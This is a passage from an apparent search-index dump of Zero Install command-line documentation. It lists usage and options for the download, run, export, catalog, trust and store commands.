A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version. <code>--version-for <code>URI</code> <code>RANGE</code></code> For any library or sub-component with the given <code>URI</code> specifies the version <code>RANGE</code> (as for <code>--version</code>). <code>-s</code><code>--source</code> Select source code rather than a binary. This is used internally by 0compile. <code>--os <code>OS</code></code> Forces the solver to target the operating system <code>OS</code>. Supported values: <code>\\*</code>, <code>POSIX</code>, <code>Linux</code>, <code>Solaris</code>, <code>FreeBSD</code>, <code>Darwin</code>, <code>MacOSX</code>, <code>Cygwin</code>, <code>Windows</code>, <code>unknown</code> <code>--cpu <code>CPU</code></code> Forces the solver to target a specific <code>CPU</code>. Supported values: <code>\\*</code>, <code>i386</code>, <code>i486</code>, <code>i586</code>, <code>i686</code>, <code>x86_64</code>, <code>ppc</code>, <code>ppc64</code>, <code>armv6l</code>, <code>armv7l</code>, <code>src</code> <code>--language</code> Specifies the preferred language for the implementation. Use ISO short language codes (e.g. <code>en</code> or <code>en-US</code>). You can use this option multiple times to specify multiple acceptable languages. <code>--xml</code> Write output to console as machine-readable XML."},{"location":"details/cli/#download","title":"download","text":"<p>Behaves similarly to <code>0install select</code>, except that it also downloads the selected versions if they are not already cached. Returns an exit status of <code>0</code> if it selected a suitable set of versions and they are now all downloaded and in the cache; returns a status of <code>1</code> otherwise.</p> <p>Usage: <code>0install download [OPTIONS] URI</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--customize</code>(Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>--with-store <code>DIR</code></code> Add <code>DIR</code> to the list of implementation caches to search. However, new downloads will not be written to this directory. <code>--command <code>COMMAND</code></code> Instead of executing the default command, use <code>COMMAND</code> instead. Possible command names are defined in the program's interface. Set to empty (<code>\"\"</code>) to ignore the command during selection. <code>--before <code>VERSION</code></code> Require a version of the main program earlier than <code>VERSION</code>. i.e., force the use of an old version the program. <code>--not-before <code>VERSION</code></code> Require a version of the main program not earlier than <code>VERSION</code>. E.g., if you want to run version 2.0 or later, use <code>--not-before=2.0</code>. <code>--version <code>RANGE</code></code> Require a version of the main program within the given <code>RANGE</code>. Ranges are separated by pipes (<code>|</code>). Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version. <code>--version-for <code>URI</code> <code>RANGE</code></code> For any library or sub-component with the given <code>URI</code> specifies the version <code>RANGE</code> (as for <code>--version</code>). <code>-s</code><code>--source</code> Select source code rather than a binary. This is used internally by 0compile. <code>--os <code>OS</code></code> Forces the solver to target the operating system <code>OS</code>. Supported values: <code>\\*</code>, <code>POSIX</code>, <code>Linux</code>, <code>Solaris</code>, <code>FreeBSD</code>, <code>Darwin</code>, <code>MacOSX</code>, <code>Cygwin</code>, <code>Windows</code>, <code>unknown</code> <code>--cpu <code>CPU</code></code> Forces the solver to target a specific <code>CPU</code>. Supported values: <code>\\*</code>, <code>i386</code>, <code>i486</code>, <code>i586</code>, <code>i686</code>, <code>x86_64</code>, <code>ppc</code>, <code>ppc64</code>, <code>armv6l</code>, <code>armv7l</code>, <code>src</code> <code>--language</code> Specifies the preferred language for the implementation. Use ISO short language codes (e.g. <code>en</code> or <code>en-US</code>). You can use this option multiple times to specify multiple acceptable languages. <code>--xml</code> Write selected versions to console as machine-readable XML. <code>--show</code> Show where the selected components are stored on the disk."},{"location":"details/cli/#update","title":"update","text":"<p>Checks for updates to the program and download them if found. This is similar to <code>0install download --refresh</code>, except that it prints information about whether any changes were found.</p> <p>Usage: <code>0install update [OPTIONS] URI</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--customize</code>(Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. <code>--with-store <code>DIR</code></code> Add <code>DIR</code> to the list of implementation caches to search. However, new downloads will not be written to this directory. <code>--command <code>COMMAND</code></code> Instead of executing the default command, use <code>COMMAND</code> instead. Possible command names are defined in the program's interface. Set to empty (<code>\"\"</code>) to ignore the command during selection. <code>--before <code>VERSION</code></code> Require a version of the main program earlier than <code>VERSION</code>. i.e., force the use of an old version the program. <code>--not-before <code>VERSION</code></code> Require a version of the main program not earlier than <code>VERSION</code>. E.g., if you want to run version 2.0 or later, use <code>--not-before=2.0</code>. <code>--version <code>RANGE</code></code> Require a version of the main program within the given <code>RANGE</code>. Ranges are separated by pipes (<code>|</code>). Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version. <code>--version-for <code>URI</code> <code>RANGE</code></code> For any library or sub-component with the given <code>URI</code> specifies the version <code>RANGE</code> (as for <code>--version</code>). <code>-s</code><code>--source</code> Select source code rather than a binary. This is used internally by 0compile. <code>--os <code>OS</code></code> Forces the solver to target the operating system <code>OS</code>. Supported values: <code>\\*</code>, <code>POSIX</code>, <code>Linux</code>, <code>Solaris</code>, <code>FreeBSD</code>, <code>Darwin</code>, <code>MacOSX</code>, <code>Cygwin</code>, <code>Windows</code>, <code>unknown</code> <code>--cpu <code>CPU</code></code> Forces the solver to target a specific <code>CPU</code>. Supported values: <code>\\*</code>, <code>i386</code>, <code>i486</code>, <code>i586</code>, <code>i686</code>, <code>x86_64</code>, <code>ppc</code>, <code>ppc64</code>, <code>armv6l</code>, <code>armv7l</code>, <code>src</code> <code>--language</code> Specifies the preferred language for the implementation. Use ISO short language codes (e.g. <code>en</code> or <code>en-US</code>). You can use this option multiple times to specify multiple acceptable languages."},{"location":"details/cli/#run","title":"run","text":"<p>Behaves similarly to <code>0install download</code>, except that it also runs the program after ensuring it is in the cache. Returns an exit status of <code>1</code> if the download step failed. Otherwise, the exit status will be the exit status of the program being run.</p> <p>Usage: <code>0install run [OPTIONS] URI [ARGS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--customize</code>(Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>--with-store <code>DIR</code></code> Add <code>DIR</code> to the list of implementation caches to search. However, new downloads will not be written to this directory. <code>--command <code>COMMAND</code></code> Instead of executing the default command, use <code>COMMAND</code> instead. Possible command names are defined in the program's interface. Set to empty (<code>\"\"</code>) to ignore the command during selection. <code>--before <code>VERSION</code></code> Require a version of the main program earlier than <code>VERSION</code>. i.e., force the use of an old version the program. <code>--not-before <code>VERSION</code></code> Require a version of the main program not earlier than <code>VERSION</code>. E.g., if you want to run version 2.0 or later, use <code>--not-before=2.0</code>. <code>--version <code>RANGE</code></code> Require a version of the main program within the given <code>RANGE</code>. Ranges are separated by pipes (<code>|</code>). Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version. <code>--version-for <code>URI</code> <code>RANGE</code></code> For any library or sub-component with the given <code>URI</code> specifies the version <code>RANGE</code> (as for <code>--version</code>). <code>-s</code><code>--source</code> Select source code rather than a binary. This is used internally by 0compile. <code>--os <code>OS</code></code> Forces the solver to target the operating system <code>OS</code>. Supported values: <code>\\*</code>, <code>POSIX</code>, <code>Linux</code>, <code>Solaris</code>, <code>FreeBSD</code>, <code>Darwin</code>, <code>MacOSX</code>, <code>Cygwin</code>, <code>Windows</code>, <code>unknown</code> <code>--cpu <code>CPU</code></code> Forces the solver to target a specific <code>CPU</code>. Supported values: <code>\\*</code>, <code>i386</code>, <code>i486</code>, <code>i586</code>, <code>i686</code>, <code>x86_64</code>, <code>ppc</code>, <code>ppc64</code>, <code>armv6l</code>, <code>armv7l</code>, <code>src</code> <code>--language</code> Specifies the preferred language for the implementation. Use ISO short language codes (e.g. <code>en</code> or <code>en-US</code>). You can use this option multiple times to specify multiple acceptable languages. <code>-m <code>MAIN</code></code><code>--main <code>MAIN</code></code> Run the specified executable <code>MAIN</code> instead of the default. If it starts with <code>/</code> or <code>\\</code> then the path is relative to the implementation's top-level directory, whereas otherwise it is relative to the directory containing the default main program. May not contain command-line arguments! Whitespaces do not need to be escaped. <code>-w <code>COMMAND</code></code><code>--wrapper <code>COMMAND</code></code> Instead of executing the chosen program directly, run <code>COMMAND</code> <code>PROGRAM</code> <code>ARGS</code>. This is useful for running debuggers and tracing tools on the program (rather than on Zero Install!). Note that the wrapper is executed in the environment selected by the program; hence, this mechanism cannot be used for sandboxing. May contain command-line arguments. Whitespaces must be escaped! <code>--no-wait</code>(Windows only) Immediately returns once the chosen program has been launched instead of waiting for it to finish executing. On Windows the exit code is the process ID of the launched program."},{"location":"details/cli/#import","title":"import","text":"<p>Imports a feed from a local file, as if it had been downloaded from the network. This is useful when testing a feed file, to avoid uploading it to a remote server in order to download it again. The file must have a trusted digital signature, as when fetching from the network.</p> <p>Usage: <code>0install import FEED-FILE [...]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#export","title":"export","text":"<p>Exports all feeds and implementations required to launch the program specified by a <code>URI</code> to a <code>DIRECTORY</code>.</p> <p>Usage: <code>0install export [OPTIONS] URI DIRECTORY</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--customize</code>(Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>--with-store <code>DIR</code></code> Add <code>DIR</code> to the list of implementation caches to search. However, new downloads will not be written to this directory. <code>--command <code>COMMAND</code></code> Instead of executing the default command, use <code>COMMAND</code> instead. Possible command names are defined in the program's interface. Set to empty (<code>\"\"</code>) to ignore the command during selection. <code>--before <code>VERSION</code></code> Require a version of the main program earlier than <code>VERSION</code>. i.e., force the use of an old version the program. <code>--not-before <code>VERSION</code></code> Require a version of the main program not earlier than <code>VERSION</code>. E.g., if you want to run version 2.0 or later, use <code>--not-before=2.0</code>. <code>--version <code>RANGE</code></code> Require a version of the main program within the given <code>RANGE</code>. Ranges are separated by pipes (<code>|</code>). Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version. <code>--version-for <code>URI</code> <code>RANGE</code></code> For any library or sub-component with the given <code>URI</code> specifies the version <code>RANGE</code> (as for <code>--version</code>). <code>-s</code><code>--source</code> Select source code rather than a binary. This is used internally by 0compile. <code>--os <code>OS</code></code> Forces the solver to target the operating system <code>OS</code>. Supported values: <code>\\*</code>, <code>POSIX</code>, <code>Linux</code>, <code>Solaris</code>, <code>FreeBSD</code>, <code>Darwin</code>, <code>MacOSX</code>, <code>Cygwin</code>, <code>Windows</code>, <code>unknown</code> <code>--cpu <code>CPU</code></code> Forces the solver to target a specific <code>CPU</code>. Supported values: <code>\\*</code>, <code>i386</code>, <code>i486</code>, <code>i586</code>, <code>i686</code>, <code>x86_64</code>, <code>ppc</code>, <code>ppc64</code>, <code>armv6l</code>, <code>armv7l</code>, <code>src</code> <code>--language</code> Specifies the preferred language for the implementation. Use ISO short language codes (e.g. <code>en</code> or <code>en-US</code>). You can use this option multiple times to specify multiple acceptable languages. <code>--no-implementations</code> Do not include implementation archives in the export. Only export feeds. <code>--include-zero-install</code> Include Zero Install itself in the export alongside the application. <code>--bootstrap <code>VALUE</code></code> Choose the type of Bootstrapper to place alongside the export. Supported values: <code>None</code>, <code>Run</code>, <code>Integrate</code>"},{"location":"details/cli/#search","title":"search","text":"<p>Searches for feeds indexed by the mirror server that match specified keywords. Note that the default mirror server indexes all known feeds, regardless of quality; you must decide whether to    the programs before running them.</p> <p>Usage: <code>0install search QUERY</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#list","title":"list","text":"<p>Lists all locally known feed URIs. If a search term is given, only URIs containing that string are shown (case insensitive).</p> <p>Usage: <code>0install list [PATTERN]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#catalog-search","title":"catalog search","text":"<p>Searches registered catalogs for applications that match the specified query. If no query is given all applications in the catalogs are listed.</p> <p>Usage: <code>0install catalog search [QUERY]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#catalog-refresh","title":"catalog refresh","text":"<p>Refreshes (downloads) all registered catalogs.</p> <p>Usage: <code>0install catalog refresh</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#catalog-add","title":"catalog add","text":"<p>Adds an URI to the list of catalogs.</p> <p>Usage: <code>0install catalog add URI</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--skip-verify</code> Skip downloading the catalog to verify it is valid before adding it to the list."},{"location":"details/cli/#catalog-remove","title":"catalog remove","text":"<p>Removes an URI from the list of catalogs.</p> <p>Usage: <code>0install catalog remove URI</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#catalog-reset","title":"catalog reset","text":"<p>Resets the list of catalogs to the default source.</p> <p>Usage: <code>0install catalog reset</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#catalog-list","title":"catalog list","text":"<p>Lists all registered catalogs.</p> <p>Usage: <code>0install catalog list</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#config","title":"config","text":"<p>View or change configuration settings. With no arguments, it displays all settings and their current values. With one argument, it displays the current value of the named setting. With two arguments, it sets the setting to the given value or resets it to the default value if the value <code>default</code> is given.</p> <p>Usage: <code>0install config [NAME [VALUE|default]]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--tab <code>TAB</code></code> Switch to a specific tab in the configuration GUI. Possible <code>TAB</code>s are <code>updates</code>, <code>storage</code>, <code>catalog</code>, <code>trust</code>, <code>sync</code>, <code>language</code>, <code>language</code> and <code>advanced</code>. Has no effect in text-mode."},{"location":"details/cli/#trust-add","title":"trust add","text":"<p>Trusts feeds from a specific <code>DOMAIN</code> when signed with a specific <code>FINGERPRINT</code>.</p> <p>Usage: <code>0install trust add FINGERPRINT DOMAIN</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#trust-remove","title":"trust remove","text":"<p>Stops trusting feeds signed with a specific <code>FINGERPRINT</code>. Only stops trusting for a specific <code>DOMAIN</code>, if specified.</p> <p>Usage: <code>0install trust remove FINGERPRINT [DOMAIN]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#trust-list","title":"trust list","text":"<p>List keys trusted for signing feeds. Only list domains for which a specific <code>FINGERPRINT</code> is trusted, if specified.</p> <p>Usage: <code>0install trust list [FINGERPRINT]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#add-feed","title":"add-feed","text":"<p>Register an additional source of implementations (versions) of a program.</p> <p>Usage: <code>0install add-feed [OPTIONS] [INTERFACE] FEED</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds."},{"location":"details/cli/#remove-feed","title":"remove-feed","text":"<p>Un-registers a feed, reversing the effect of <code>0install add-feed</code>.</p> <p>Usage: <code>0install remove-feed [OPTIONS] [INTERFACE] FEED</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds."},{"location":"details/cli/#list-feeds","title":"list-feeds","text":"<p>Lists all extra feeds added to URI using <code>0install add-feed</code>.</p> <p>Usage: <code>0install list-feeds [OPTIONS] URI</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#digest","title":"digest","text":"<p>Calculates the manifest digest of a directory or archive.</p> <p>Usage: <code>0install digest (DIRECTORY | ARCHIVE [SUBDIR])</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--manifest</code> Display the manifest itself (one line for each file or directory). <code>--digest</code> Display the manifest's digest (enabled by default if --manifest is not set). <code>--algorithm <code>HASH</code></code> The <code>HASH</code> algorithm to use for the digest. Supported values: <code>sha256new</code>, <code>sha256</code>, <code>sha1new</code>"},{"location":"details/cli/#store-add","title":"store add","text":"<p>Adds the contents of a directory or archive to the cache.</p> <p>Usage: <code>0install store add DIGEST (DIRECTORY | (ARCHIVE [EXTRACT [MIME-TYPE [...]]))</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-audit","title":"store audit","text":"<p>Checks that all implementations in the cache are undamaged. Additional arguments specify custom cache locations.</p> <p>Usage: <code>0install store audit [CACHE-DIR+]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-copy","title":"store copy","text":"<p>Copies an implementation into the cache. Similar to <code>0install store add</code>, but the digest is extracted from the directory name. An additional arguments specifies a custom target cache location.</p> <p>Usage: <code>0install store copy DIRECTORY [CACHE]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-export","title":"store export","text":"<p>Exports a cached implementation as an archive (ZIP, TAR, etc.). The result can be imported on another machine using <code>0install store add</code>.</p> <p>Usage: <code>0install store export DIGEST OUTPUT-ARCHIVE [MIME-TYPE]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-find","title":"store find","text":"<p>Determines the local path of a cached implementation.</p> <p>Usage: <code>0install store find DIGEST</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-list","title":"store list","text":"<p>Lists all implementation cache directories.</p> <p>Usage: <code>0install store list</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-list-implementations","title":"store list-implementations","text":"<p>Lists all cached implementations. If a feed URI is specified only implementations for that particular feed are listed.</p> <p>Usage: <code>0install store list-implementations [FEED-URI]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-manage","title":"store manage","text":"<p>Displays a graphical user interface for managing implementations in the cache. Shows associations with cached feeds.</p> <p>Usage: <code>0install store manage</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-optimise","title":"store optimise","text":"<p>Saves disk space by merging identical files with hardlinks. Additional arguments specify custom cache locations.</p> <p>Usage: <code>0install store optimise [CACHE-DIR+]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-purge","title":"store purge","text":"<p>Removes all implementations from the cache. Use this command to clean up the system before removing Zero Install. Deleting cache directories manually may be difficult due to the NTFS ACLs   yed to protect implementations against modification. Additional arguments specify custom cache locations.</p> <p>Usage: <code>0install store purge [CACHE-DIR+]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-remove","title":"store remove","text":"<p>Removes an implementation from the cache.</p> <p>Usage: <code>0install store remove DIGEST+</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-verify","title":"store verify","text":"<p>Makes sure an implementation has not been damaged (i.e. if manifest digest has not changed).</p> <p>Usage: <code>0install store verify [DIRECTORY] DIGEST</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-serve","title":"store serve","text":"<p>Serves implementations from the cache as archives via HTTP</p> <p>Usage: <code>0install store serve [PORT]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#store-add-dir","title":"store add-dir","text":"<p>Adds a directory to the list of custom implementation caches.</p> <p>Usage: <code>0install store add-dir PATH</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user."},{"location":"details/cli/#store-remove-dir","title":"store 